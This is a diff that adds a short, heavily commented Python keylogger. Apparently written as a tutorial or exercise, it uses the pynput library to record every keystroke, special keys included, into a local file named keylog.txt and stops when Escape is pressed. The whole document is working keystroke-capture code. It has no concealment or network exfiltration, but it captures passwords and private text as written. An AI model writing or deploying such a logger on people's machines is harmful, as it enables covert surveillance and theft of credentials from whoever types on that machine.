@@ -1,0 +1,49 @@
+# Import the 'Listener' class from the 'pynput.keyboard' module
+from pynput import keyboard
+
+# Define the path for your log file.
+# Using a simple .txt file is perfect for this task.
+log_file = "keylog.txt"
+
+def on_press(key):
+    """
+    This function is called every time a key is pressed.
+    It takes the 'key' that was pressed as an argument.
+    """
+    try:
+        # We try to open the log file in 'append' mode ('a').
+        # 'with open' ensures the file is properly closed even if an error occurs.
+        with open(log_file, "a") as f:
+            # We write the character of the key to the file.
+            # key.char gives the regular character (e.g., 'a', 'b', '1', '$').
+            # This will raise an AttributeError for special keys (like Shift, Ctrl),
+            # which is why we have the 'except' block.
+            f.write(key.char)
+            
+    except AttributeError:
+        # This block handles special keys (e.g., Key.space, Key.shift, Key.esc).
+        with open(log_file, "a") as f:
+            # We format the special key's name to be more readable
+            # and write it to the file.
+            f.write(f"[{str(key)}] ")
+
+
+def on_release(key):
+    """
+    This function is called every time a key is released.
+    For this task, we can just make it stop the listener if the Escape key is pressed.
+    This gives us a way to exit the program gracefully.
+    """
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# --- Main part of the script ---
+
+# We create a listener instance.
+# 'on_press' is the function to call when a key is pressed.
+# 'on_release' is the function to call when a key is released.
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    # listener.join() blocks the script from ending, keeping the listener active.
+    # The listener runs in a separate thread.
+    listener.join()
